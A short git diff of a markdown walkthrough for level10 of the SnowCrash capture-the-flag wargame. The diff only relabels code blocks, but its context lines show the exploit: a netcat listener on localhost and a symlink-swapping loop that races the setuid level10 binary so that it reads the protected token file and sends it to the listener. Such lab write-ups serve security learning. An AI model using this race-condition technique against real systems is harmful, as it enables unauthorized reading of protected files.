@@ -7,7 +7,7 @@
 - There is also a file named `token` owned by `flag10`.
 - Groups and others have no rights on `token`.
 
-```sh
+```console
 level10@SnowCrash:~$ ls -al
 total 28
 dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
@@ -91,7 +91,7 @@ $ while true ; do netcat -l 127.0.0.1 6969; done
 
 - and run the loops on another one.
 
-```sh
+```console
 level10@SnowCrash:~$ touch /tmp/mykey
 level10@SnowCrash:~$ while true; do ln -sf /home/user/level10/token /tmp/mykey; ln -sf /tmp/test /tmp/mykey; done &
 level10@SnowCrash:~$ for i in {1..1000}; do /home/user/level10/level10 /tmp/mykey 127.0.0.1; done
